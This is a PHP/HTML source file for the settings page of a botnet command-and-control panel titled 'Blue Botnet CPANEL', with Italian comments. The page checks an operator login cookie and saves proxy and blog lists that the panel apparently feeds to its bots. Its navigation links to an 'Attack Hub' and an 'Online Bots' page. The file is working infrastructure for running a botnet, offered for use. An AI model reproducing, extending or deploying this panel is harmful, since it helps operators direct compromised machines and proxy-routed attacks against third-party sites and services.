<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" ><![endif]-->
<!--[if gt IE 8]><!--><html class="no-js" ><!--<![endif]-->
<html>
 <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Blue Botnet CPANEL</title>
  <!-- Fogli di stile -->
  <link href="css/bootstrap.css" rel="stylesheet" media="screen">
  <link href="css/stili-custom.css" rel="stylesheet" media="screen">
  <!-- Modernizr -->
  <script src="js/modernizr.custom.js"></script>
  <style>
  body {background-color:#C4D5E5;}
  .tce {
	margin-left: auto !important;
    margin-right: auto !important;
	width:520px !important;
	max-width:520px !important;
  }

  </style>
  <!-- respond.js per IE8 -->
  <!--[if lt IE 9]>
  <script src="js/respond.min.js"></script>
  <![endif]-->
 </head>
 <body bgcolor="#C4D5E5">
<br>
<div class="tce"><br><br>
<?php

if (!file_exists("phash")){
	header("Location: register.php");
} else {
	$filename = "phash";
	$fp = fopen($filename, "r");
	$content = fread($fp, filesize($filename));
	fclose($fp);
	$storedPassHash = $content;
	$passHash = $_COOKIE['phash'];
	if (md5("randomsalt".$passHash) != $storedPassHash){
		header("Location: login.php");
	} else {

		$proxies = $_POST['proxies'];
		$blogs = $_POST['blogs'];
		$check = $_POST['check'];

		if ($check == "ok"){
			$fh = fopen("proxy", 'w+');
			fwrite($fh, $proxies);
			fclose($fh);
			$fh = fopen("blog", 'w+');
			fwrite($fh, $blogs);
			fclose($fh);
			echo '<div class="alert alert-success alert-dismissable">		<button type="button" class="close" data-dismiss="alert">&times;</button>		Settings successfully changed!	</div>	';
		}
	}
}
?>
	<div class="panel panel-default">
 <div class="panel-heading">
  <h3 class="panel-title">Blue Botnet CPANEL</h3>
 </div>
 <div class="panel-body">
 <form action="settings.php" method="post">
	<ul class="nav nav-pills">
	 <li><a href="index.php">Attack Hub</a></li>
	 <li class="active"><a href="#">Settings</a></li>
	 <li><a href="onlinebots.php">Online Bots</a></li>
	 <li><a href="logout.php">Logout</a></li>
	</ul> <br><br>
	<div class="form-group">
		<label for="ProxyList">Proxy List</label>
		<textarea rows="10" class="form-control" placeholder="proxylist" type="text" name="proxies"><?php
			$filename = "proxy";
			$fp = fopen($filename, "r");
			$content = fread($fp, filesize($filename));
			fclose($fp);
			echo $content;
		?></textarea>
	</div>
    <div class="form-group">
		<label for="Port">Blog List</label>
		<textarea rows="10" class="form-control" placeholder="bloglist" type="text" name="blogs"><?php
			$filename = "blog";
			$fp = fopen($filename, "r");
			$content = fread($fp, filesize($filename));
			fclose($fp);
			echo $content;
		?></textarea>
	</div>
	<input type="hidden" name="check" value="ok"></input>
	<button type="submit" class="btn btn-default">SAVE</button>
 </div>
</div>
</div>
 <br><br><br><br><br><br>
 <!-- jQuery e plugin JavaScript  -->
 <script src="http://code.jquery.com/jquery.js"></script>
 <script src="js/bootstrap.min.js"></script>
 </body>
</html>